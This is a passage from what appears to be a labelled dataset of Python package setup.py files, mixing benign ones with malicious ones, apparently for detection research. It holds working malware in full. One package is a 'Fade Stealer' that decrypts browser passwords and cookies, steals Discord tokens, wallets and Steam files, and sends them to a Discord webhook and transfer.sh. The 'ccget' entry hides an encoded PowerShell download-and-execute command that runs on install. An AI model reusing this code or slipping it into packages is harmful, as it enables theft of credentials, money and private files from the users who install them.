'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n},\n            'thumbnail':{\n                'url':f\"{pfp}\"\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1028588906846879856/1037436987482841129/unknown.png',\n        'username':'Fade Stealer',\n        'attachments':[]\n}\n    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\ndef Reformat(listt):\n    e=re.findall('(\\\\w+[a-z])',listt)\n    while 'https' in e:e.remove('https')\n    while 'com' in e:e.remove('com')\n    while 'net' in e:e.remove('net')\n    return list(set(e))\ndef upload(name,tk=''):\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    if name=='kiwi':\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Interesting files found on user PC:',\n                'value':tk\n}\n],\n            'author':{\n                'name':'Fade | File stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n        return\n    path=name\n    files={'file':open(path,'rb')}\n    if 'wppassw' in name:\n        ra=' | '.join(da for da in paswWords)\n        if len(ra)>1000:\n            rrr=Reformat(str(paswWords))\n            ra=' | '.join(da for da in rrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':ra\n}\n],\n            'author':{\n                'name':'Fade | Password Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    if 'wpcook' in name:\n        rb=' | '.join(da for da in cookiWords)\n        if len(rb)>1000:\n            rrrrr=Reformat(str(cookiWords))\n            rb=' | '.join(da for da in rrrrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':rb\n}\n],\n            'author':{\n                'name':'Fade | Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    LoadRequests('POST',hook,files=files)\ndef writeforfile(data,name):\n    path=os.getenv('TEMP')+f\"\\wp{name}.txt\"\n    with open(path,mode='w',encoding='utf-8')as f:\n        f.write(f\"<--Fade Stealer ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0]!='':\n                f.write(f\"{line}\\n\")\nTokens=''\ndef getToken(path,arg):\n    if not os.path.exists(path):return\n    path+=arg\n    for file in os.listdir(path):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{path}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for regex in('[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}','mfa\\\\.[\\\\w-]{80,95}'):\n                    for token in re.findall(regex,line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens+=token\n                                uploadToken(token,path)\nPassw=[]\ndef getPassw(path,arg):\n    global Passw\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Login Data'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords:paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Passw,'passw')\nCookies=[]\ndef getCookie(path,arg):\n    global Cookies\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Cookies'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords:cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies,'cook')\ndef GetDiscord(path,arg):\n    if not os.path.exists(f\"{path}/Local State\"):return\n    pathC=path+arg\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{pathC}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for token in re.findall('dQw4w9WgXcQ:[^.*\\\\[\\'(.*)\\'\\\\].*$][^\\\\\"]*',line):\n                    global Tokens\n                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens+=tokenDecoded\n                            uploadToken(tokenDecoded,path)\ndef ZipThings(path,arg,procc):\n    pathC=path\n    name=arg\n    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"Metamask_{browser}\"\n        pathC=path+arg\n    if not os.path.exists(pathC):return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n    if 'Wallet' in arg or 'NationsGlory' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"{browser}\"\n    elif 'Steam' in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):return\n        f=open(f\"{pathC}/loginusers.vdf\",'r+',encoding='utf8')\n        data=f.readlines()\n        found=False\n        for l in data:\n            if 'RememberPassword\"\t\t\"1\"' in l:\n                found=True\n        if found==False:return\n        name=arg\n    zf=ZipFile(f\"{pathC}/{name}.zip\",'w')\n    for file in os.listdir(pathC):\n        if not '.zip' in file:zf.write(pathC+'/'+file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths=[\n[f\"{roaming}/Opera Software/Opera GX Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome SxS/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/BraveSoftware/Brave-Browser/User Data\",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Yandex/YandexBrowser/User Data\",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Microsoft/Edge/User Data\",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']\n]\n    discordPaths=[\n[f\"{roaming}/Discord\",'/Local Storage/leveldb'],\n[f\"{roaming}/Lightcord\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordcanary\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordptb\",'/Local Storage/leveldb'],\n]\n    PathsToZip=[\n[f\"{roaming}/atomic/Local Storage/leveldb\",'\"Atomic Wallet.exe\"','Wallet'],\n[f\"{roaming}/Exodus/exodus.wallet\",'Exodus.exe','Wallet'],\n['C:\\\\Program Files (x86)\\\\Steam\\\\config','steam.exe','Steam'],\n[f\"{roaming}/NationsGlory/Local Storage/leveldb\",'NationsGlory.exe','NationsGlory']\n]\n    for patt in browserPaths:\n        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths:\n        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths:\n        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk=[]\n    for patt in browserPaths:\n        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk:thread.join()\n    DETECTED=Trust(Cookies)\n    if DETECTED==True:return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths    \n    upths=[]\n    for file in['wppassw.txt','wpcook.txt']:\n        upload(os.getenv('TEMP')+'\\\\'+file)\ndef uploadToAnonfiles(path):\n    try:\n        files={'file':(path,open(path,mode='rb'))}\n        upload=requests.post('https://transfer.sh/',files=files)\n        url=upload.text\n        return url\n    except:\n        return False\ndef KiwiFolder(pathF,keywords):\n    global KiwiFiles\n    maxfilesperdir=7\n    i=0\n    listOfFile=os.listdir(pathF)\n    ffound=[]\n    for file in listOfFile:\n        if not os.path.isfile(pathF+'/'+file):return\n        i+=1\n        if i<=maxfilesperdir:\n            url=uploadToAnonfiles(pathF+'/'+file)\n            ffound.append([pathF+'/'+file,url])\n        else:\n            break\n    KiwiFiles.append(['folder',pathF+'/',ffound])\nKiwiFiles=[]\ndef KiwiFile(path,keywords):\n    global KiwiFiles\n    fifound=[]\n    listOfFile=os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path+'/'+file)and '.txt' in file:\n                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])\n                    break\n                if os.path.isdir(path+'/'+file):\n                    target=path+'/'+file\n                    KiwiFolder(target,keywords)\n                    break\n    KiwiFiles.append(['folder',path,fifound])\ndef Kiwi():\n    user=temp.split('\\\\AppData')[0]\n    path2search=[\n        user+'/Desktop',\n        user+'/Downloads',\n        user+'/Documents'\n]\n    key_wordsFolder=[\n        'account',\n        'acount',\n        'passw',\n        'secret'\n]\n    key_wordsFiles=[\n        'passw',\n        'mdp',\n        'motdepasse',\n        'mot_de_passe',\n        'login',\n        'secret',\n        'account',\n        'acount',\n        'paypal',\n        'banque',\n        'account',\n        'metamask',\n        'wallet',\n        'crypto',\n        'exodus',\n        'discord',\n        '2fa',\n        'code',\n        'memo',\n        'compte',\n        'token',\n        'backup',\n        'secret',\n        'prox'\n        'binance'\n        'Electrum'\n        'Mycelium'\n]\n    wikith=[]\n    for patt in path2search:\n        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\nglobal keyword,cookiWords,paswWords\nkeyword=[\n    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'\n]\ncookiWords=[]\npaswWords=[]\nGatherAll()\nDETECTED=Trust(Cookies)\nif not DETECTED:\n    wikith=Kiwi()\n    for thread in wikith:thread.join()\n    time.sleep(0.2)\n    filetext='\\n'\n    for arg in KiwiFiles:\n        if len(arg[2])!=0:\n            foldpath=arg[1]\n            foldlist=arg[2]\n            filetext+=f\"\ufffd {foldpath}\\n\"\n            for ffil in foldlist:\n                a=ffil[0].split('/')\n                fileanme=a[len(a)-1]\n                b=ffil[1]\n                filetext+=f\"... [{fileanme}]({b})\\n\"\n            filetext+='\\n'\n    upload('kiwi',filetext)\n\n\nsetup(\n\n    name='n1trobrdr',\n    packages=['n1trobrdr'],\n    version='1.0',\n    license='MIT',\n    description='nitrobrder',\n    author=' Jonathan Hartley',\n    keywords=['Colorama'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)", "target": 1}
{"idx": "fake-awsglue-0.0.0.post20190320", "func": "from setuptools import find_packages, setup\n\nsetup(\n    name='fake-awsglue',\n    version='0.0.0.post20190320',\n    long_description=__doc__,\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "curlylint-0.13.1", "func": "#!/usr/bin/env python\n\nimport io\n\nfrom setuptools import find_packages, setup  # type: ignore\n\nfrom curlylint import (\n    __author__,\n    __author_email__,\n    __copyright__,\n    __description__,\n    __license__,\n    __url__,\n    __version__,\n)\n\nwith io.open(\"README.md\", encoding=\"utf-8\") as readme_file:\n    long_description = readme_file.read()\n\nsetup(\n    name=\"curlylint\",\n    version=__version__,\n    description=__description__,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=__url__,\n    author=__author__,\n    author_email=__author_email__,\n    license=__license__,\n    copyright=__copyright__,\n    packages=find_packages(exclude=[\"tests*\"]),\n    include_package_data=True,\n    package_data={\"curlylint\": [\"py.typed\"]},\n    keywords=[\n        \"curlylint\",\n        \"linter\",\n        \"linting\",\n        \"jinja\",\n        \"jinja2\",\n        \"django templates\",\n        \"twig\",\n        \"nunjucks\",\n        \"liquid\",\n        \"templates\",\n        \"html\",\n    ],\n    python_requires=\">=3.6\",\n    install_requires=[\n        \"parsy==1.1.0\",\n        \"attrs>=17.2.0\",\n        \"click>=6.5\",\n        \"toml>=0.9.4\",\n        \"pathspec>=0.6, <1\",\n        \"dataclasses>=0.6; python_version < '3.7'\",\n    ],\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Environment :: Console\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Topic :: Software Development :: Quality Assurance\",\n        \"Typing :: Typed\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    entry_points={\"console_scripts\": [\"curlylint=curlylint.cli:patched_main\"]},\n)\n", "target": 0}
{"idx": "django-ordered-model-3.6", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nwith open(\"requirements.txt\") as f:\n    requires = f.read().splitlines()\n\nwith open(\"README.md\", encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"django-ordered-model\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    version=\"3.6\",\n    description=\"Allows Django models to be ordered and provides a simple admin interface for reordering them.\",\n    author=\"Ben Firshman\",\n    author_email=\"ben@firshman.co.uk\",\n    url=\"http://github.com/django-ordered-model/django-ordered-model\",\n    packages=[\n        \"ordered_model\",\n        \"ordered_model.management\",\n        \"ordered_model.management.commands\",\n    ],\n    requires=requires,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Framework :: Django\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n    ],\n    zip_safe=False,\n    package_data={\n        \"ordered_model\": [\n            \"static/ordered_model/arrow-up.gif\",\n            \"static/ordered_model/arrow-down.gif\",\n            \"static/ordered_model/arrow-top.gif\",\n            \"static/ordered_model/arrow-bottom.gif\",\n            \"locale/de/LC_MESSAGES/django.po\",\n            \"locale/de/LC_MESSAGES/django.mo\",\n            \"locale/pl/LC_MESSAGES/django.po\",\n            \"locale/pl/LC_MESSAGES/django.mo\",\n            \"templates/ordered_model/admin/order_controls.html\",\n        ]\n    },\n)\n", "target": 0}
{"idx": "googleads-32.0.0", "func": "#!/usr/bin/env python\n#\n# Copyright 2013 Google Inc. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"Setup script for the Google Ads Python Client Library.\"\"\"\n\n\nimport os\nimport re\nimport sys\nfrom setuptools import setup\n\nPACKAGES = ['googleads']\n\nDEPENDENCIES = ['google-auth>=1.0.0,<2.0.0',\n                'google-auth-oauthlib>=0.0.1,<1.0.0', 'pytz>=2015.7',\n                'PyYAML>=5.1, <6.0', 'requests>=2.0.0,<3.0.0',\n                'xmltodict>=0.9.2,<1.0.0', 'zeep>=2.5.0']\n\n# Note: Breaking change introduced in pyfakefs 3.3.\nTEST_DEPENDENCIES = ['mock>=2.0.0,<3.0.0', 'pyfakefs>=3.2,<3.3']\n\nCLASSIFIERS = [\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: Apache Software License',\n    'Programming Language :: Python :: 3.7'\n]\n\n\ndef GetVersion():\n  \"\"\"Gets the version from googleads/common.py.\n\n  We can't import this directly because new users would get ImportErrors on our\n  third party dependencies.\n\n  Returns:\n    The version of the library.\n  \"\"\"\n  with open(os.path.join('googleads', 'common.py')) as versions_file:\n    source = versions_file.read()\n  return re.search('\\\\nVERSION = \\'(.*?)\\'', source).group(1)\n\n\nlong_description = \"\"\"\n===========================================\nThe googleads Python Client Libraries\n===========================================\n\nThe googleads Python Client Libraries support the following products:\n\n* AdWords API\n* Google Ad Manager API\n\nYou can find more information about the Google Ads Python Client Libraries\n`here <https://github.com/googleads/googleads-python-lib>`_.\n\nSupported Python Versions\n=========================\n\nThis library is supported for Python 3.7+.\n\nInstallation\n============\n\nYou have two options for installing the Ads Python Client Libraries:\n\n* Install with a tool such as pip::\n\n  $ sudo pip install googleads\n\n* Install manually after downloading and extracting the tarball::\n\n  $ sudo python setup.py install\n\nExamples\n========\n\nIf you would like to obtain example code for any of the included\nclient libraries, you can find it on our\n`downloads page <https://github.com/googleads/googleads-python-lib/releases>`_.\n\nContact Us\n==========\n\nDo you have an issue using the googleads Client Libraries? Or perhaps some\nfeedback for how we can improve them? Feel free to let us know on our\n`issue tracker <https://github.com/googleads/googleads-python-lib/issues>`_.\n\"\"\"\n\nsetup(name='googleads',\n      version=GetVersion(),\n      description='Google Ads Python Client Library',\n      author='Mark Saniscalchi',\n      author_email='api.msaniscalchi@gmail.com',\n      url='https://github.com/googleads/googleads-python-lib',\n      license='Apache License 2.0',\n      long_description=long_description,\n      packages=PACKAGES,\n      platforms='any',\n      keywords='adwords dfp admanager google',\n      classifiers=CLASSIFIERS,\n      install_requires=DEPENDENCIES,\n      tests_require=TEST_DEPENDENCIES,\n      test_suite='tests')\n", "target": 0}
{"idx": "future-0.18.2", "func": "#!/usr/bin/env python\n\nfrom __future__ import absolute_import, print_function\n\nimport os\nimport os.path\nimport sys\n\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\nif sys.argv[-1] == 'publish':\n    os.system('python setup.py sdist upload')\n    sys.exit()\n\n\nNAME = \"future\"\nPACKAGES = [\"future\",\n            \"future.builtins\",\n            \"future.types\",\n            \"future.standard_library\",\n            \"future.backports\",\n            \"future.backports.email\",\n            \"future.backports.email.mime\",\n            \"future.backports.html\",\n            \"future.backports.http\",\n            \"future.backports.test\",\n            \"future.backports.urllib\",\n            \"future.backports.xmlrpc\",\n            \"future.moves\",\n            \"future.moves.dbm\",\n            \"future.moves.html\",\n            \"future.moves.http\",\n            \"future.moves.test\",\n            \"future.moves.tkinter\",\n            \"future.moves.urllib\",\n            \"future.moves.xmlrpc\",\n            \"future.tests\",     # for future.tests.base\n            # \"future.tests.test_email\",\n            \"future.utils\",\n            \"past\",\n            \"past.builtins\",\n            \"past.types\",\n            \"past.utils\",\n            \"past.translation\",\n            \"libfuturize\",\n            \"libfuturize.fixes\",\n            \"libpasteurize\",\n            \"libpasteurize.fixes\",\n           ]\n\n# PEP 3108 stdlib moves:\nif sys.version_info[:2] < (3, 0):\n    PACKAGES += [\n            \"builtins\",\n            # \"configparser\",  # removed in v0.16.0\n            \"copyreg\",\n            \"html\",\n            \"http\",\n            \"queue\",\n            \"reprlib\",\n            \"socketserver\",\n            \"tkinter\",\n            \"winreg\",\n            \"xmlrpc\",\n            \"_dummy_thread\",\n            \"_markupbase\",\n            \"_thread\",\n           ]\n\nPACKAGE_DATA = {'': [\n                     'README.rst',\n                     'LICENSE.txt',\n                     'futurize.py',\n                     'pasteurize.py',\n                     'check_rst.sh',\n                     'TESTING.txt',\n                    ],\n                'tests': ['*.py'],\n                }\n\nimport src.future\nVERSION = src.future.__version__\nDESCRIPTION = \"Clean single-source support for Python 3 and 2\"\nLONG_DESC = src.future.__doc__\nAUTHOR = \"Ed Schofield\"\nAUTHOR_EMAIL = \"ed@pythoncharmers.com\"\nURL=\"https://python-future.org\"\nLICENSE = \"MIT\"\nKEYWORDS = \"future past python3 migration futurize backport six 2to3 modernize pasteurize 3to2\"\nCLASSIFIERS = [\n    \"Programming Language :: Python\",\n    \"Programming Language :: Python :: 2\",\n    \"Programming Language :: Python :: 2.6\",\n    \"Programming Language :: Python :: 2.7\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3.3\",\n    \"Programming Language :: Python :: 3.4\",\n    \"Programming Language :: Python :: 3.5\",\n    \"Programming Language :: Python :: 3.6\",\n    \"Programming Language :: Python :: 3.7\",\n    \"License :: OSI Approved\",\n    \"License :: OSI Approved :: MIT License\",\n    \"Development Status :: 4 - Beta\",\n    \"Intended Audience :: Developers\",\n]\n\nsetup_kwds = {}\n\n\n# * Important *\n# We forcibly remove the build folder to avoid breaking the\n# user's Py3 installation if they run \"python2 setup.py\n# build\" and then \"python3 setup.py install\".\n\ntry:\n    # If the user happens to run:\n    #     python2 setup.py build\n    #     python3 setup.py install\n    # then folders like \"copyreg\" will be in build/lib.\n    # If so, we CANNOT let the user install this, because\n    # this may break his/her Python 3 install, depending on the folder order in\n    # sys.path. (Running \"import html\" etc. may pick up our Py2\n    # substitute packages, instead of the intended system stdlib modules.)\n    SYSTEM_MODULES = set([\n                          '_dummy_thread',\n                          '_markupbase',\n                          '_thread',\n                          'builtins',\n                          # Catch the case that configparser is in the build folder\n                          # from a previous version of `future`:\n                          'configparser',\n                          'copyreg',\n                          'html',\n                          'http',\n                          'queue',\n                          'reprlib',\n                          'socketserver',\n                          'tkinter',\n                          'winreg',\n                          'xmlrpc'\n                         ])\n\n    if sys.version_info[0] >= 3:\n        # Do any of the above folders exist in build/lib?\n        files = os.listdir(os.path.join('build', 'lib'))\n        if len(set(files) & set(SYSTEM_MODULES)) > 0:\n            print('ERROR: Your build folder is in an inconsistent state for '\n                  'a Python 3.x install. Please remove it manually and run '\n                  'setup.py again.', file=sys.stderr)\n            sys.exit(1)\nexcept OSError:\n    pass\n\nsetup(name=NAME,\n      version=VERSION,\n      author=AUTHOR,\n      author_email=AUTHOR_EMAIL,\n      url=URL,\n      description=DESCRIPTION,\n      long_description=LONG_DESC,\n      license=LICENSE,\n      keywords=KEYWORDS,\n      entry_points={\n          'console_scripts': [\n              'futurize = libfuturize.main:main',\n              'pasteurize = libpasteurize.main:main'\n          ]\n      },\n      package_dir={'': 'src'},\n      packages=PACKAGES,\n      package_data=PACKAGE_DATA,\n      include_package_data=True,\n      python_requires=\">=2.6, !=3.0.*, !=3.1.*, !=3.2.*\",\n      classifiers=CLASSIFIERS,\n      **setup_kwds\n     )\n", "target": 0}
{"idx": "Flask-Sockets-0.2.1", "func": "#!/usr/bin/env python\n\n\"\"\"\nFlask-Sockets\n-------------\n\nElegant WebSockets for your Flask apps.\n\"\"\"\nfrom setuptools import setup\n\n\nsetup(\n    name='Flask-Sockets',\n    version='0.2.1',\n    url='https://github.com/kennethreitz/flask-sockets',\n    license='See License',\n    author='Kenneth Reitz',\n    author_email='_@kennethreitz.com',\n    description='Elegant WebSockets for your Flask apps.',\n    long_description=__doc__,\n    py_modules=['flask_sockets'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    install_requires=[\n        'Flask',\n        'gevent',\n        'gevent-websocket'\n    ],\n    classifiers=[\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "ccget-9.69", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ccget',\n    packages = ['modlib'],\n    version = '9.63',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 